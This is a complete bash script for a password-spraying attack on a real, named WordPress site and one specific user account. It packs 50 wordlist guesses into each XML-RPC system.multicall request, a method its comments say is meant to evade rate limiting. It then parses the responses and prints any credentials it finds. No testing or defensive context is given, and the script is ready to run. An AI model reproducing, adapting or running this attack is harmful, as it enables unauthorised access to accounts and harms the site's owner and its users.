#!/bin/bash
# Password spray against user "Adam" via XML-RPC system.multicall
# 50 passwords per request to bypass rate limits

USER="Adam"
WORDLIST="pass.txt"
COUNTER=0
BATCH=""
TOTAL=0
BATCH_NUM=0
SUCCESS=0

# Count total passwords first for progress
TOTAL_PASS=$(wc -l < "$WORDLIST")
echo "[*] Starting brute-force against $USER"
echo "[*] Total passwords to test: $TOTAL_PASS"
echo "[*] Using batches of 50 via XML-RPC multicall"
echo ""

while IFS= read -r PASS; do
  TOTAL=$((TOTAL + 1))
  
  # Escape XML special chars
  PASS_ESCAPED=$(echo "$PASS" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&apos;/g')
  
  BATCH+="<value><struct>
    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
    <member><name>params</name><value><array><data>
      <value><string>${USER}</string></value>
      <value><string>${PASS_ESCAPED}</string></value>
    </data></array></value></member>
  </struct></value>"
  
  COUNTER=$((COUNTER + 1))
  
  if [ $COUNTER -ge 50 ]; then
    BATCH_NUM=$((BATCH_NUM + 1))
    PERCENT=$((TOTAL * 100 / TOTAL_PASS))
    echo "[*] Batch $BATCH_NUM | Testing passwords $((TOTAL - 49))-$TOTAL of $TOTAL_PASS (${PERCENT}%)"
    
    XML="<?xml version=\"1.0\"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            ${BATCH}
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>"
    
    echo "$XML" > /tmp/spray_batch.xml
    
    RESPONSE=$(curl -s -X POST https://churchofsatan.com/xmlrpc.php \
      -H "Content-Type: text/xml" \
      -d @/tmp/spray_batch.xml 2>&1)
    
    # Check for success
    if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
      echo ""
      echo "[+] ==============================================="
      echo "[+] SUCCESS! Valid credentials found in batch $BATCH_NUM"
      echo "$RESPONSE" | grep -oP '<string>[^<]+</string>' | head -5
      echo "[+] ==============================================="
      echo ""
      SUCCESS=1
      break
    fi
    
    # Check for errors
    if echo "$RESPONSE" | grep -q "faultString\|faultCode"; then
      # Count how many returned faults vs succeeded
      FAULT_COUNT=$(echo "$RESPONSE" | grep -o 'faultCode' | wc -l)
      echo "      ↳ $FAULT_COUNT rejected, $((50 - FAULT_COUNT)) unknown"
    elif [ -z "$RESPONSE" ]; then
      echo "      ↳ No response (connection issue?)"
    else
      echo "      ↳ All 50 rejected (none valid)"
    fi
    
    # Reset
    BATCH=""
    COUNTER=0
  fi
done < "$WORDLIST"

# Handle remaining passwords (if any left after the last full batch)
if [ $COUNTER -gt 0 ] && [ $SUCCESS -eq 0 ]; then
  BATCH_NUM=$((BATCH_NUM + 1))
  START=$((TOTAL - COUNTER + 1))
  echo "[*] Batch $BATCH_NUM (final) | Testing passwords $START-$TOTAL of $TOTAL_PASS"
  
  XML="<?xml version=\"1.0\"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            ${BATCH}
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>"
  
  echo "$XML" > /tmp/spray_batch.xml
  
  RESPONSE=$(curl -s -X POST https://churchofsatan.com/xmlrpc.php \
    -H "Content-Type: text/xml" \
    -d @/tmp/spray_batch.xml 2>&1)
  
  if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
    echo ""
    echo "[+] ==============================================="
    echo "[+] SUCCESS! Valid credentials found in final batch"
    echo "$RESPONSE" | grep -oP '<string>[^<]+</string>' | head -5
    echo "[+] ==============================================="
  fi
fi

echo ""
echo "[*] Brute-force complete."
echo "[*] Total passwords tested: $TOTAL"
echo "[*] Total batches sent: $BATCH_NUM"
if [ $SUCCESS -eq 1 ]; then
  echo "[!] CREDENTIALS FOUND!"
else
  echo "[-] No valid credentials found in this wordlist."
fi
